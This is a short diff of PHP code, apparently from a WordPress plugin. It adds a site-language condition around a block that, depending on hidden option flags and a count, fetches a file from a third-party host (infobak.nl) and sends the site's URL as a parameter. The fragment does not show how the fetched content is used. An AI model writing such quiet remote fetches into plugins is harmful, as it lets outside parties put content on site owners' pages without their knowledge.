@@ -385,7 +385,7 @@ if ($britt==true && $total>5) {
 				update_option( 'ame_gpadded', '1' );
 		}
 }
-
+if ($bloglan=='en-US' && $total>5) {
 		if (get_option('ame_gpadded')=='0') {
 				if ($total>40) {
 						$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
@@ -402,6 +402,7 @@ if ($britt==true && $total>5) {
 						}
 				}
 		}
+}
 
 }
 
